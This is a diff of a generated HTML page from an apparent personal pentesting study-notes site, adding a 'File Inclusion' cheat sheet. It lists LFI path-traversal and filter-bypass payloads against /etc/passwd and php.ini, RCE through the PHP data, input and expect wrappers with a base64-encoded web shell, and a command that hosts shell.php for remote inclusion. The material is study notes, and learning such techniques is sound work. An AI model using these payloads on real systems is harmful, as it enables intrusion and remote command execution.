@@ -9,28 +9,28 @@
       
       
       
-        <link rel="prev" href="../reconnaissance/">
+        <link rel="prev" href="../cross-site-scripting-%28xss%29/">
       
       
-        <link rel="next" href="../bscp-study-notes/">
+        <link rel="next" href="../file-upload-attacks/">
       
       
         
       
       
-      <link rel="icon" href="../assets/images/favicon.png">
+      <link rel="icon" href="../../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
     
     
       
-        <title>Reporting & POC - Dan's Cyber Stuff</title>
+        <title>File Inclusion - Dan's Cyber Stuff</title>
       
     
     
-      <link rel="stylesheet" href="../assets/stylesheets/main.484c7ddc.min.css">
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
       
         
-        <link rel="stylesheet" href="../assets/stylesheets/palette.ab4e12ef.min.css">
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
       
       
 
@@ -49,7 +49,7 @@
       
     
     
-    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
       
 
@@ -74,7 +74,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#reporting-poc" class="md-skip">
+        <a href="#file-inclusion" class="md-skip">
           Skip to content
         </a>
       
@@ -90,7 +90,7 @@
 
 <header class="md-header md-header--shadow" data-md-component="header">
   <nav class="md-header__inner md-grid" aria-label="Header">
-    <a href=".." title="Dan&#39;s Cyber Stuff" class="md-header__button md-logo" aria-label="Dan's Cyber Stuff" data-md-component="logo">
+    <a href="../.." title="Dan&#39;s Cyber Stuff" class="md-header__button md-logo" aria-label="Dan's Cyber Stuff" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
@@ -110,7 +110,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Reporting & POC
+              File Inclusion
             
           </span>
         </div>
@@ -214,7 +214,7 @@
 
 <nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
-    <a href=".." title="Dan&#39;s Cyber Stuff" class="md-nav__button md-logo" aria-label="Dan's Cyber Stuff" data-md-component="logo">
+    <a href="../.." title="Dan&#39;s Cyber Stuff" class="md-nav__button md-logo" aria-label="Dan's Cyber Stuff" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
@@ -232,7 +232,7 @@
   
   
     <li class="md-nav__item">
-      <a href=".." class="md-nav__link">
+      <a href="../.." class="md-nav__link">
         
   
   
@@ -308,7 +308,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../owasp-top-10-2025/" class="md-nav__link">
+      <a href="../../owasp-top-10-2025/" class="md-nav__link">
         
   
   
@@ -336,7 +336,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../reconnaissance/" class="md-nav__link">
+      <a href="../../reconnaissance/" class="md-nav__link">
         
   
   
@@ -361,37 +361,10 @@
                 
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  
-  <span class="md-ellipsis">
-    
-  
-    Reporting & POC
-  
-
-    
-  </span>
-  
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../../reporting-and-poc/" class="md-nav__link">
         
   
   
@@ -407,148 +380,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#report-sections" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Report Sections
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Report Sections">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#cvss-31" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        CVSS 3.1
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="CVSS 3.1">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#attack-vector" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Attack Vector
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#attack-complexity" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Attack Complexity
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#privileges-required" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Privileges Required
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#user-interaction" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        User Interaction
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#scope" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Scope
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#confidentiality" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Confidentiality
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#integrity" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Integrity
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#availability" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Availability
-      
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -608,7 +439,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../bscp-study-notes/" class="md-nav__link">
+      <a href="../../bscp-study-notes/" class="md-nav__link">
         
   
   
@@ -636,7 +467,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../bscp-study-notes/authentication-vulnerabilities/" class="md-nav__link">
+      <a href="../../bscp-study-notes/authentication-vulnerabilities/" class="md-nav__link">
         
   
   
@@ -664,7 +495,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../bscp-study-notes/business-logic-vulnerabilities/" class="md-nav__link">
+      <a href="../../bscp-study-notes/business-logic-vulnerabilities/" class="md-nav__link">
         
   
   
@@ -692,7 +523,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../bscp-study-notes/command-injection/" class="md-nav__link">
+      <a href="../../bscp-study-notes/command-injection/" class="md-nav__link">
         
   
   
@@ -720,7 +551,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../bscp-study-notes/cross-site-scripting/" class="md-nav__link">
+      <a href="../../bscp-study-notes/cross-site-scripting/" class="md-nav__link">
         
   
   
@@ -748,7 +579,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../bscp-study-notes/path-traversal/" class="md-nav__link">
+      <a href="../../bscp-study-notes/path-traversal/" class="md-nav__link">
         
   
   
@@ -776,7 +607,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../bscp-study-notes/sql-injection/" class="md-nav__link">
+      <a href="../../bscp-study-notes/sql-injection/" class="md-nav__link">
         
   
   
@@ -859,7 +690,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cwee-study-notes/" class="md-nav__link">
+      <a href="../../cwee-study-notes/" class="md-nav__link">
         
   
   
@@ -887,7 +718,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cwee-study-notes/attacking-authentication-mechanisms/" class="md-nav__link">
+      <a href="../../cwee-study-notes/attacking-authentication-mechanisms/" class="md-nav__link">
         
   
   
@@ -915,7 +746,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cwee-study-notes/injection-attacks/" class="md-nav__link">
+      <a href="../../cwee-study-notes/injection-attacks/" class="md-nav__link">
         
   
   
@@ -943,7 +774,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cwee-study-notes/introduction-to-nosql-injection/" class="md-nav__link">
+      <a href="../../cwee-study-notes/introduction-to-nosql-injection/" class="md-nav__link">
         
   
   
@@ -971,7 +802,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cwee-study-notes/intro-to-whitebox-pentesting/" class="md-nav__link">
+      <a href="../../cwee-study-notes/intro-to-whitebox-pentesting/" class="md-nav__link">
         
   
   
@@ -1004,18 +835,20 @@
                 
   
   
+    
   
   
+  
     
     
     
     
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_6" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_6" checked>
         
           
           <label class="md-nav__link" for="__nav_2_6" id="__nav_2_6_label" tabindex="0">
@@ -1036,7 +869,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_6_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_6_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_2_6">
             <span class="md-nav__icon md-icon"></span>
             
@@ -1054,7 +887,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cwes-study-notes/api-attacks/" class="md-nav__link">
+      <a href="../api-attacks/" class="md-nav__link">
         
   
   
@@ -1082,7 +915,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cwes-study-notes/attacking-common-applications/" class="md-nav__link">
+      <a href="../attacking-common-applications/" class="md-nav__link">
         
   
   
@@ -1110,7 +943,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cwes-study-notes/attacking-graphql/" class="md-nav__link">
+      <a href="../attacking-graphql/" class="md-nav__link">
         
   
   
@@ -1138,7 +971,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cwes-study-notes/attacking-web-applications-with-ffuf/" class="md-nav__link">
+      <a href="../attacking-web-applications-with-ffuf/" class="md-nav__link">
         
   
   
@@ -1166,7 +999,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cwes-study-notes/broken-authentication/" class="md-nav__link">
+      <a href="../broken-authentication/" class="md-nav__link">
         
   
   
@@ -1194,7 +1027,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cwes-study-notes/command-injections/" class="md-nav__link">
+      <a href="../command-injections/" class="md-nav__link">
         
   
   
@@ -1222,7 +1055,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cwes-study-notes/cross-site-scripting-%28xss%29/" class="md-nav__link">
+      <a href="../cross-site-scripting-%28xss%29/" class="md-nav__link">
         
   
   
@@ -1247,10 +1080,37 @@
                 
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="../cwes-study-notes/file-inclusion/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    File Inclusion
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   
@@ -1266,6 +1126,120 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#local-file-inclusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Local File Inclusion
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Local File Inclusion">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#second-order-attacks" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Second order attacks
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#checking-php-configurations" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Checking PHP Configurations
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#remote-code-execution" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Remote Code Execution
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#misc" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Misc
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#lfi-wordlists" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        LFI Wordlists
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#lfi-tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        LFI tools
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#file-inclusion-functions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        File Inclusion Functions
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -1278,7 +1252,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cwes-study-notes/file-upload-attacks/" class="md-nav__link">
+      <a href="../file-upload-attacks/" class="md-nav__link">
         
   
   
@@ -1306,7 +1280,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cwes-study-notes/hacking-wordpress/" class="md-nav__link">
+      <a href="../hacking-wordpress/" class="md-nav__link">
         
   
   
@@ -1334,7 +1308,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cwes-study-notes/javascript-deobfuscation/" class="md-nav__link">
+      <a href="../javascript-deobfuscation/" class="md-nav__link">
         
   
   
@@ -1362,7 +1336,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cwes-study-notes/login-brute-forcing/" class="md-nav__link">
+      <a href="../login-brute-forcing/" class="md-nav__link">
         
   
   
@@ -1390,7 +1364,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cwes-study-notes/server-side-attacks/" class="md-nav__link">
+      <a href="../server-side-attacks/" class="md-nav__link">
         
   
   
@@ -1418,7 +1392,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cwes-study-notes/session-security/" class="md-nav__link">
+      <a href="../session-security/" class="md-nav__link">
         
   
   
@@ -1446,7 +1420,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cwes-study-notes/sql-injection-fundamentals/" class="md-nav__link">
+      <a href="../sql-injection-fundamentals/" class="md-nav__link">
         
   
   
@@ -1474,7 +1448,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cwes-study-notes/sqlmap-essentials/" class="md-nav__link">
+      <a href="../sqlmap-essentials/" class="md-nav__link">
         
   
   
@@ -1502,7 +1476,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cwes-study-notes/web-attacks/" class="md-nav__link">
+      <a href="../web-attacks/" class="md-nav__link">
         
   
   
@@ -1530,7 +1504,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cwes-study-notes/web-fuzzing/" class="md-nav__link">
+      <a href="../web-fuzzing/" class="md-nav__link">
         
   
   
@@ -1558,7 +1532,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cwes-study-notes/web-service-and-api-attacks/" class="md-nav__link">
+      <a href="../web-service-and-api-attacks/" class="md-nav__link">
         
   
   
@@ -1641,7 +1615,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../android-application-pentesting/" class="md-nav__link">
+      <a href="../../android-application-pentesting/" class="md-nav__link">
         
   
   
@@ -1669,7 +1643,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../android-application-pentesting/android-fundamentals/" class="md-nav__link">
+      <a href="../../android-application-pentesting/android-fundamentals/" class="md-nav__link">
         
   
   
@@ -1697,7 +1671,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../android-application-pentesting/android-application-static-analysis/" class="md-nav__link">
+      <a href="../../android-application-pentesting/android-application-static-analysis/" class="md-nav__link">
         
   
   
@@ -1725,7 +1699,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../android-application-pentesting/android-application-dynamic-analysis/" class="md-nav__link">
+      <a href="../../android-application-pentesting/android-application-dynamic-analysis/" class="md-nav__link">
         
   
   
@@ -1808,7 +1782,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../tools-and-protocols/curl/" class="md-nav__link">
+      <a href="../../tools-and-protocols/curl/" class="md-nav__link">
         
   
   
@@ -1836,7 +1810,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../tools-and-protocols/ftp/" class="md-nav__link">
+      <a href="../../tools-and-protocols/ftp/" class="md-nav__link">
         
   
   
@@ -1864,7 +1838,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../tools-and-protocols/gobuster/" class="md-nav__link">
+      <a href="../../tools-and-protocols/gobuster/" class="md-nav__link">
         
   
   
@@ -1892,7 +1866,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../tools-and-protocols/nmap/" class="md-nav__link">
+      <a href="../../tools-and-protocols/nmap/" class="md-nav__link">
         
   
   
@@ -1955,34 +1929,22 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#report-sections" class="md-nav__link">
+  <a href="#local-file-inclusion" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Report Sections
+        Local File Inclusion
       
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="Report Sections">
+    <nav class="md-nav" aria-label="Local File Inclusion">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#cvss-31" class="md-nav__link">
+  <a href="#second-order-attacks" class="md-nav__link">
     <span class="md-ellipsis">
       
-        CVSS 3.1
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="CVSS 3.1">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#attack-vector" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Attack Vector
+        Second order attacks
       
     </span>
   </a>
@@ -1990,76 +1952,10 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#attack-complexity" class="md-nav__link">
+  <a href="#checking-php-configurations" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Attack Complexity
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#privileges-required" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Privileges Required
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#user-interaction" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        User Interaction
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#scope" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Scope
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#confidentiality" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Confidentiality
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#integrity" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Integrity
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#availability" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Availability
+        Checking PHP Configurations
       
     </span>
   </a>
@@ -2070,9 +1966,59 @@
     </nav>
   
 </li>
-        
-      </ul>
-    </nav>
+      
+        <li class="md-nav__item">
+  <a href="#remote-code-execution" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Remote Code Execution
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#misc" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Misc
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#lfi-wordlists" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        LFI Wordlists
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#lfi-tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        LFI tools
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#file-inclusion-functions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        File Inclusion Functions
+      
+    </span>
+  </a>
   
 </li>
       
@@ -2093,121 +2039,396 @@
 
 
 
-<h1 id="reporting-poc">Reporting &amp; POC</h1>
-<h2 id="report-sections">Report Sections</h2>
+<h1 id="file-inclusion">File Inclusion</h1>
+<h2 id="local-file-inclusion">Local File Inclusion</h2>
+<ul>
+<li>Two common readable files that are available on most back-end servers are /etc/passwd on Linux and C:\Windows\boot.ini on Windows.</li>
+<li>If we find files on the web server (.php files for example), that return other status codes than 200 when fuzzing, these can still be viewed with LFI, so should not be ignored.</li>
+<li>If files get rendered during LFI we can encode them first, then decode to read the source code.</li>
+<li>If the web serrver adds a file extension like .php we do not need to add it when trying to LFI index.php, for example, to read the source code.</li>
+</ul>
 <table>
 <thead>
 <tr>
-<th>Section</th>
+<th>Command</th>
 <th>Description</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td>Title</td>
-<td>Concise vulnerability name including type, target, and impact</td>
+<td><strong>Basic LFI</strong></td>
+<td></td>
 </tr>
 <tr>
-<td>Severity</td>
-<td>Overall severity rating (Low/Medium/High)</td>
+<td><code>/index.php?language=/etc/passwd</code></td>
+<td>Basic LFI</td>
 </tr>
 <tr>
-<td>Impact</td>
-<td>Impact rating (Low/Medium/High)</td>
+<td><code>/index.php?language=../../../../etc/passwd</code></td>
+<td>LFI with path traversal</td>
 </tr>
 <tr>
-<td>Exploitability</td>
-<td>Exploitability rating (Low/Medium/High)</td>
+<td><code>/index.php?language=/../../../etc/passwd</code></td>
+<td>LFI with name prefix</td>
 </tr>
 <tr>
-<td>CVSS Base Score</td>
-<td>Numerical CVSS base score</td>
+<td><code>/index.php?language=./languages/../../../../etc/passwd</code></td>
+<td>LFI with approved path</td>
 </tr>
 <tr>
-<td>CVSS v3 Vector</td>
-<td>Full CVSS v3.1 vector string</td>
+<td><strong>LFI Bypasses</strong></td>
+<td></td>
 </tr>
 <tr>
-<td>Vulnerability Type</td>
-<td>Type of vulnerability (e.g. XSS, IDOR)</td>
+<td><code>/index.php?language=....//....//....//....//etc/passwd</code></td>
+<td>Bypass basic path traversal filter</td>
 </tr>
 <tr>
-<td>Target</td>
-<td>Affected endpoint, parameter, domain, or asset</td>
+<td><code>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64</code></td>
+<td>Bypass filters with URL encoding</td>
 </tr>
 <tr>
-<td>Impact</td>
-<td>Detailed business and technical impact of exploitation</td>
+<td><code>/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]</code></td>
+<td>Bypass appended extension with path truncation (obsolete) <code>echo -n "non_existing_directory/../../../etc/passwd/" &amp;&amp; for i in {1..2048}; do echo -n "./"; done</code></td>
 </tr>
 <tr>
-<td>Description</td>
-<td>Clear explanation of the vulnerability cause and mechanics</td>
+<td><code>/index.php?language=../../../../etc/passwd%00</code></td>
+<td>Bypass appended extension with null byte (obsolete)</td>
 </tr>
 <tr>
-<td>Steps to Reproduce</td>
-<td>Concise, step-by-step reproduction instructions</td>
-</tr>
-<tr>
-<td>Recommendation</td>
-<td>Specific remediation or mitigation steps</td>
+<td><code>/index.php?language=php://filter/read=convert.base64-encode/resource=config</code></td>
+<td>Read PHP with base64 filter</td>
 </tr>
 </tbody>
 </table>
-<h3 id="cvss-31">CVSS 3.1</h3>
-<h4 id="attack-vector">Attack Vector</h4>
-<p>Shows how the vulnerability can be exploited.</p>
+<h3 id="second-order-attacks">Second order attacks</h3>
+<p>Setting user names to <code>../../../../etc/passwd</code>, for example, could result in the LFI elsewhere the username is used.</p>
+<h3 id="checking-php-configurations">Checking PHP Configurations</h3>
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1">curl<span class="w"> </span><span class="s2">&quot;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini&quot;</span><span class="w"> </span>
+</span><span id="__span-0-2"><span class="c1"># 7.4 should be whatever php version is in use</span>
+</span><span id="__span-0-3"><span class="c1"># /etc/php/X.Y/apache2/php.ini for Apache or /etc/php/X.Y/fpm/php.ini for nginx</span>
+</span><span id="__span-0-4"><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>allow_url_include
+</span><span id="__span-0-5"><span class="c1"># check for value of allow_url_include (not enabled by default)</span>
+</span><span id="__span-0-6"><span class="c1"># allow_url_include required to be on for use of various wrappers, including the data and input wrappers</span>
+</span><span id="__span-0-7"><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>expect
+</span><span id="__span-0-8"><span class="c1"># check for except extension</span>
+</span><span id="__span-0-9">python3<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import urllib.parse;print(urllib.parse.quote_plus(&quot;PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==&quot;))&#39;</span>
+</span><span id="__span-0-10"><span class="c1"># URL encoding for get requests</span>
+</span></code></pre></div></td></tr></table></div>
+<h2 id="remote-code-execution">Remote Code Execution</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong><a href="https://www.php.net/manual/en/wrappers.php.php">PHP Wrappers</a></strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=id</code></td>
+<td>RCE with <code>data</code> wrapper (only available to use if the <code>allow_url_include</code> setting is enabled in the PHP configurations), base64 encoded <code>'&lt;?php system($_GET["cmd"]); ?&gt;'</code>, prepend with <code>curl -s 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;</code> to preform with curl in command prompt</td>
+</tr>
+<tr>
+<td><code>curl -s -X POST --data '&lt;?php system($_GET["cmd"]); ?&gt;' "http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://input&amp;cmd=id"</code></td>
+<td>RCE with input wrapper</td>
+</tr>
+<tr>
+<td><code>curl -s "http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=expect://id"</code></td>
+<td>RCE with expect wrapper</td>
+</tr>
+<tr>
+<td><strong>RFI</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=http://127.0.0.1:80/index.php</code></td>
+<td>Start by trying to include a local string, see if included as source code or executed as php etc <strong>NOTE</strong> Including the page itself (i.e. index.php) could cause a recursive loop DOS</td>
+</tr>
+<tr>
+<td><code>echo '&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.php &amp;&amp; python3 -m http.server &lt;LISTENING_PORT&gt;</code></td>
+<td>Host web shell</td>
+</tr>
